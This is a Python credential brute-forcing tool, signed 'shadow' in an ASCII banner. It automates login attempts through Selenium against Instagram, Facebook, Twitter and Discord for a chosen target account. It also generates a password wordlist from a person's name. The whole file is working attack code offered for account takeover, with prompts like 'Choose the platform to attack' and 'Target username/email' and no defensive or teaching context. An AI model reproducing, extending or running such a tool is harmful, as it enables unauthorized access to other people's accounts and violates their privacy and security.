import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

RED = "\033[91m"
RESET = "\033[0m"

def print_banner():
    banner_lines = [
        "███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗               ██████╗ ███████╗",
        "██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔══██╗              ╚════██╗╚════██║",
        "███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██████╔╝    █████╗     █████╔╝    ██╔╝",
        "╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗    ╚════╝     ╚═══██╗   ██╔╝ ",
        "███████║██║███████╗███████╗██║ ╚████║   ██║██╗██████╔╝              ██████╔╝   ██║  ",
        "╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝╚═╝╚═════╝               ╚═════╝    ╚═╝  "
    ]

    side_box = [
        "┌────────────┐",
        "│ by: shadow │",
        "│ ig:7.O_6z  │",
        "└────────────┘"
    ]

    for i in range(len(banner_lines)):
        if i < len(side_box):
            print(f"{RED}{banner_lines[i]}{RESET}   {RED}{side_box[i]}{RESET}")
        else:
            print(f"{RED}{banner_lines[i]}{RESET}")

def brute_force_instagram(chromedriver_path, username, passwords):
    for password in passwords:
        try:
            driver = webdriver.Chrome(executable_path=chromedriver_path)
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(5)

            user_input = driver.find_element(By.NAME, "username")
            user_input.send_keys(username)

            pass_input = driver.find_element(By.NAME, "password")
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            print(f"[*] Trying: {password}")
            time.sleep(6)

            if "challenge" in driver.current_url or "two_factor" in driver.current_url:
                print(f"\n[✓] Success! Password found: {password}")
                driver.quit()
                return
            else:
                driver.quit()
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            continue

    print("\n[-] Done. No password matched.")

def brute_force_facebook(chromedriver_path, username, passwords):
    for password in passwords:
        try:
            driver = webdriver.Chrome(executable_path=chromedriver_path)
            driver.get("https://www.facebook.com/login.php")
            time.sleep(5)

            user_input = driver.find_element(By.ID, "email")
            user_input.send_keys(username)

            pass_input = driver.find_element(By.ID, "pass")
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            print(f"[*] Trying: {password}")
            time.sleep(6)

            if "login" not in driver.current_url:
                print(f"[✓] Success! Password found: {password}")
                driver.quit()
                return
            else:
                driver.quit()
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            continue

    print("\n[-] Done. No password matched.")

def brute_force_twitter(chromedriver_path, username, passwords):
    for password in passwords:
        try:
            driver = webdriver.Chrome(executable_path=chromedriver_path)
            driver.get("https://twitter.com/login")
            time.sleep(5)

            user_input = driver.find_element(By.NAME, "text")
            user_input.send_keys(username)
            user_input.send_keys(Keys.RETURN)
            time.sleep(3)

            pass_input = driver.find_element(By.NAME, "password")
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            print(f"[*] Trying: {password}")
            time.sleep(6)

            if "login" not in driver.current_url:
                print(f"[✓] Success! Password found: {password}")
                driver.quit()
                return
            else:
                driver.quit()
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            continue

    print("\n[-] Done. No password matched.")

def brute_force_discord(chromedriver_path, username, passwords):
    for password in passwords:
        try:
            driver = webdriver.Chrome(executable_path=chromedriver_path)
            driver.get("https://discord.com/login")
            time.sleep(5)

            user_input = driver.find_element(By.NAME, "email")
            user_input.send_keys(username)

            pass_input = driver.find_element(By.NAME, "password")
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            print(f"[*] Trying: {password}")
            time.sleep(6)

            if "login" not in driver.current_url:
                print(f"[✓] Success! Password found: {password}")
                driver.quit()
                return
            else:
                driver.quit()
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            continue

    print("\n[-] Done. No password matched.")

def brute_force_menu():
    print("\nChoose the platform to attack:")
    print("[1] Instagram")
    print("[2] Facebook")
    print("[3] Discord")
    print("[4] Twitter")
    print("[5] Generic (custom URL)")

    choice = input("\nSelect option: ")

    chromedriver_path = input("Enter full path to chromedriver.exe: ").strip()
    username = input("Target username/email: ").strip()
    wordlist_path = input("Path to your password wordlist: ").strip()

    try:
        with open(wordlist_path, "r") as f:
            passwords = f.read().splitlines()
    except:
        print("[!] Failed to open wordlist.")
        return

    if choice == '1':
        brute_force_instagram(chromedriver_path, username, passwords)
    elif choice == '2':
        brute_force_facebook(chromedriver_path, username, passwords)
    elif choice == '3':
        brute_force_discord(chromedriver_path, username, passwords)
    elif choice == '4':
        brute_force_twitter(chromedriver_path, username, passwords)
    else:
        print("\n[!] This platform is not yet implemented.")

def generate_wordlist():
    print("\nWordlist Generator")
    name = input("Enter name: ").strip()
    numbers = [str(i) for i in range(0, 100)]
    symbols = ['!', '@', '#', '_', '-', '.']
    wordlist = set()

    for n in numbers:
        wordlist.add(name + n)
        wordlist.add(n + name)
        for s in symbols:
            wordlist.add(name + n + s)
            wordlist.add(s + name + n)

    filename = input("Enter filename to save wordlist (e.g. wordlist.txt): ").strip()
    if not filename:
        filename = "wordlist.txt"

    with open(filename, "w") as f:
        for word in wordlist:
            f.write(word + "\n")

    print(f"\nWordlist saved as {filename} with {len(wordlist)} entries.")

def menu():
    print_banner()
    print("\n[1] Brute Force Login")
    print("[2] Generate Wordlist")
    choice = input("\nChoose an option: ")

    if choice == '1':
        brute_force_menu()
    elif choice == '2':
        generate_wordlist()
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    menu()
